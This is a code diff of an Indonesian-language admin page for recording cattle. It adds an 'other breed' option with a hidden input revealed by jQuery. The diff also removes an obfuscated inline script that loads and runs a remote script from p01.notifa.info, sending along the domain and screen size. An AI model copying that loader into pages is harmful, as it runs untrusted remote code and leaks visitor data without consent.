@@ -179,12 +179,17 @@
                                     </div>
                                     <div class="form-group">
                                         <label style="color: white;">Jenis Sapi</label>
-                                        <select class="form-control bg-white">
+                                        <select id="jenissapi" class="form-control bg-white">
                                             <option >Sapi PO</option>
                                             <option >Lokal</option>
                                             <option >Bali</option>
-                                            <option >Tambah Jenis</option>
+                                            <option value="lain-lain">Lain-lain</option>
                                         </select>
+                                    </div>
+                                    <div id="sembunyi" style="display:none">
+                                        <div class="form-group">
+                                            <input type="text" placeholder="Masukkan jenis sapi baru">
+                                        </div>
                                     </div>
                                     <div class="form-group">
                                         <label style="color: white;">Jenis Kelamin Sapi</label>
@@ -260,7 +265,15 @@
     <!--- Main JS -->
     <script src="assetAdmin/assets/js/main.js"></script>
 
-    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdoP1qamj8Iz7H3xYZ27zj%2blzVQVx9ZbzdwyR2jY9nYkUWGU2eG9c%2fQpMMGXgVSSgUXwSPW3QUyx9nutG2raeXfO8RJL1o1DUMqGvHzpXP8r2TCI7fL%2bd6x2nOeX%2fgOUJmFo8i3jN9eAb7ceklO5IPQwvMUqTY%2fc7zDZjU1jrRncakGV0fTJ63gWahxbeMZ461MbIfhnVLJSpE1u%2bj%2fmjD1HoutYet5x0zLeTMlCSqHrVVG7lCokFd9bJcIii7H1AeIcCrs2KzdUMk0F79BYe6%2ffH8vXkI7kGvjimCZ36o4M3%2fqcdz4oiP3oPaLx2AFXzzSOZnkHulYb4A05k200m13GVfDWa3oJVE108ZWoeLXU%2bdYIt3sORFDhJXWqOvex4dS%2bclBxuYGauZJtcQC1BDs%2f%2bxXhj4fH0ydFupxg3nUsI2CFGC2XHEisct9DFbmfOZjZowfYhxXSAzIiASXPXEAWAgrJRYQPa%2frPYVHD%2bDjkYJkGMU4hxrT1zP6HU3%2boe%2ffpuJEP2CmgI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+    <script>
+        $('#jenissapi').change(function(){
+            if($(this).val() == 'lain-lain'){
+                $('#sembunyi').removeAttr('style');
+            }else{
+                $('#sembunyi').attr('style','display:none');
+            }
+        })
+    </script>
 
     <!-- Mirrored from wow.designgurus.in/sideNavigationLayout/blue/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Oct 2018 15:44:19 GMT -->
     </html>
